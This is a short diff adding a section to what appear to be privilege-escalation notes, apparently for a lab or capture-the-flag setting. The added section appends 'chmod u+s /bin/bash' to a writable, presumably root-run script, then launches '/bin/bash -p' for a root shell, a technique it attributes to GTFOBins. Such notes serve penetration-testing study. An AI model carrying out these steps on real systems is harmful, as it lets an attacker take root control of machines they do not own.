@@ -19,6 +19,32 @@ arch
 
 ---
 
+If worried about Firewall blocking reverse shell when appending to writable script,
+
+```
+ls -lah /bin/bash
+```
+
+This appends SUID bit to the vulnerable script
+```
+echo "chmod u+s /bin/bash" >> /var/archives/archive.sh
+```
+
+```
+ls -lah /bin/bash
+```
+Should show that /bin/bash can now be executed by normal users
+
+-rwsr-xr-r
+
+Based on gtfobins,
+```
+/bin/bash -p
+```
+
+---
+
+
 ```
 sudo -l
 ```
